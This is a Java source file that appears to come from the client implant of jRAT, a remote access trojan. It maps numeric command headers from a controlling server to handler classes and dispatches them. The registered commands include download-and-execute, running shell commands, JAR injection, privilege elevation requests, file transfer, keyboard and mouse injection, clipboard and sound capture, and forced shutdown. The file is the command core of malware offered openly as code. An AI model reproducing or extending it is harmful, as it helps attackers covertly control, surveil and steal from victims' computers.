package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.Logger;

import java.util.HashMap;
import java.util.Set;

public class IncomingPackets {

    public static final HashMap<Short, Class<? extends IncomingPacket>> PACKETS_INCOMING = new HashMap<>();

    static {
        PACKETS_INCOMING.clear();
        PACKETS_INCOMING.put((short) 0, Packet0Ping.class);
        PACKETS_INCOMING.put((short) 10, Packet10Messagebox.class);
        PACKETS_INCOMING.put((short) 11, Packet11Disconnect.class);
        PACKETS_INCOMING.put((short) 14, Packet14VisitURL.class);
        PACKETS_INCOMING.put((short) 17, Packet17DownloadExecute.class);
        PACKETS_INCOMING.put((short) 18, Packet18Update.class);
        PACKETS_INCOMING.put((short) 21, Packet21ClientUploadFile.class);
        PACKETS_INCOMING.put((short) 27, Packet27ToggleMouseLock.class);
        PACKETS_INCOMING.put((short) 28, Packet28ShutdownComputer.class);
        PACKETS_INCOMING.put((short) 29, Packet29RestartComputer.class);
        PACKETS_INCOMING.put((short) 30, Packet30LogoutComputer.class);
        PACKETS_INCOMING.put((short) 31, Packet31ComputerSleep.class);
        PACKETS_INCOMING.put((short) 32, Packet32LockComputer.class);
        PACKETS_INCOMING.put((short) 36, Packet36Uninstall.class);
        PACKETS_INCOMING.put((short) 37, Packet37RestartJavaProcess.class);
        PACKETS_INCOMING.put((short) 38, Packet38RunCommand.class);
        PACKETS_INCOMING.put((short) 39, Packet39VisitManyURLs.class);
        PACKETS_INCOMING.put((short) 40, Packet40Thumbnail.class);
        PACKETS_INCOMING.put((short) 42, Packet42ClientDownloadFile.class);
        PACKETS_INCOMING.put((short) 43, Packet43CreateDirectory.class);
        PACKETS_INCOMING.put((short) 44, Packet44PlaySoundFromURL.class);
        PACKETS_INCOMING.put((short) 46, Packet46CrazyMouse.class);
        PACKETS_INCOMING.put((short) 59, Packet59Clipboard.class);
        PACKETS_INCOMING.put((short) 61, Packet61SystemJavaProperties.class);
        PACKETS_INCOMING.put((short) 65, Packet65Beep.class);
        PACKETS_INCOMING.put((short) 66, Packet66PianoNote.class);
        PACKETS_INCOMING.put((short) 67, Packet67LongPianoNote.class);
        PACKETS_INCOMING.put((short) 69, Packet69Print.class);
        PACKETS_INCOMING.put((short) 71, Packet71LocalNetworkDevices.class);
        PACKETS_INCOMING.put((short) 73, Packet73ActivePorts.class);
        PACKETS_INCOMING.put((short) 75, Packet75AllThumbnails.class);
        PACKETS_INCOMING.put((short) 76, Packet76Speech.class);
        PACKETS_INCOMING.put((short) 77, Packet77ListServices.class);
        PACKETS_INCOMING.put((short) 78, Packet78RegistryStartup.class);
        PACKETS_INCOMING.put((short) 80, Packet80CustomRegQuery.class);
        PACKETS_INCOMING.put((short) 81, Packet81InstalledPrograms.class);
        PACKETS_INCOMING.put((short) 82, Packet82NetworkAdapters.class);
        PACKETS_INCOMING.put((short) 83, Packet83ClientDownloadSound.class);
        PACKETS_INCOMING.put((short) 84, Packet84ToggleSoundCapture.class);
        PACKETS_INCOMING.put((short) 86, Packet86ErrorLog.class);
        PACKETS_INCOMING.put((short) 87, Packet87DeleteErrorLog.class);
        PACKETS_INCOMING.put((short) 90, Packet90SystemProperties.class);
        PACKETS_INCOMING.put((short) 91, Packet91MouseMove.class);
        PACKETS_INCOMING.put((short) 92, Packet92MousePress.class);
        PACKETS_INCOMING.put((short) 93, Packet93MouseRelease.class);
        PACKETS_INCOMING.put((short) 94, Packet94KeyPress.class);
        PACKETS_INCOMING.put((short) 95, Packet95KeyRelease.class);
        PACKETS_INCOMING.put((short) 96, Packet96EnvironmentVariables.class);
        PACKETS_INCOMING.put((short) 98, Packet98InjectJAR.class);
        PACKETS_INCOMING.put((short) 100, Packet100RequestElevation.class);
        PACKETS_INCOMING.put((short) 103, Packet103CompleteClientDownload.class);
        PACKETS_INCOMING.put((short) 104, Packet104ClientDownloadPart.class);
        PACKETS_INCOMING.put((short) 106, Packet106ClientDownloadPlugin.class);
    }

    /**
     * Registers a packet
     * @param header the packet header, must be unique
     * @param packet
     * @throws Exception if the packet header is already registered
     */
    public static void register(short header, Class<? extends IncomingPacket> packet) throws Exception {
        if (PACKETS_INCOMING.containsKey(header)) {
            throw new Exception("header '" + header + "' already exists");
        }

        PACKETS_INCOMING.put(header, packet);
    }

    public static void execute(Connection con, short header) {
        try {
            IncomingPacket packet = null;
            Set<Short> set = PACKETS_INCOMING.keySet();
            for (short s : set) {
                if (s == header) {
                    packet = PACKETS_INCOMING.get(s).newInstance();
                    break;
                }
            }

            if (packet != null) {
                packet.read(con);
            } else {
                Logger.err("failed to find packet '" + header + "'");
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
